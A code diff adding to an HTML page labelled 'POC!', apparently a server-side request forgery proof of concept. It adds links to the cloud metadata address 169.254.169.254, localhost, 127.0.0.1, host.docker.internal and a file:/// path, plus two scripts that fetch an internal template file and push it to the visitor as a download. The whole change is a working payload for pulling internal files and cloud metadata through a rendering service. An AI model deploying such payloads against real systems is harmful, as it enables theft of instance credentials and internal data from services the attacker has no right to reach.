@@ -69,6 +69,50 @@
   <a href=http://169.254.169.254/> !ТЫК! </a>
   <a href=https://169.254.169.254/> !ТЫК! </a>
   <a href=http://169.254.169.254/metadata> !ТЫК! </a>
+  <a href=https://169.254.169.254/> !СЮДА! </a>
+  <a href="http://localhost:8080/templates/index.html">ТЫК</a>
+<a href="http://127.0.0.1:8080/templates/index.html">ТЫК</a>
+<a href="http://host.docker.internal:8080/templates/index.html">ТЫК</a>
+  <script>
+    function fetchFile() {
+        fetch('http://localhost:8080/templates/index.html')
+            .then(response => response.text())
+            .then(data => {
+                let element = document.createElement('a');
+                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(data));
+                element.setAttribute('download', 'index.html');
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
+            })
+            .catch(err => console.error(err));
+    }
+
+    document.getElementById("btn").addEventListener("click", fetchFile);
+</script>
+      <a href="file:///templates/index.html">ТЫК</a>
+    
+<script>
+    function downloadFile() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://localhost:8080/templates/index.html", true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                var element = document.createElement('a');
+                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(xhr.responseText));
+                element.setAttribute('download', 'index.html');
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
+            }
+        };
+        xhr.send();
+    }
+
+    document.getElementById("btn").addEventListener("click", downloadFile);
+</script>
+
+
     <h1>
     POC!
   </h1>
